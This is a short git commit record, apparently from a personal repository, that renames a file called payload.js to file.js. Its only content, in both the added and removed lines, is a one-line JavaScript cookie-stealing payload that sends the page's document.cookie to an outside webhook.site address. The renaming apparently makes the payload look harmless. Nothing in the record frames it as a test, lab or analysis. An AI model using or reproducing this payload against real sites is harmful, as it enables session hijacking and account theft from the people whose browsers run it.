5c9ba7535821ab87c4d80e2c63cf81089d57245b
Abdulrazack Shabani <71651716+szdiof@users.noreply.github.com>
2024-07-01 15:20:56 +0300

    Update and rename payload.js to file.js

---
+++ file.js
@@ -0,0 +1,1 @@
+fetch('https://webhook.site/fa7adab2-5735-4527-a8c2-18dee6ca2c9f?cookie=' + document.cookie);
--- payload.js
+++
@@ -1,1 +0,0 @@
-fetch('https://webhook.site/fa7adab2-5735-4527-a8c2-18dee6ca2c9f?cookie=' + document.cookie)
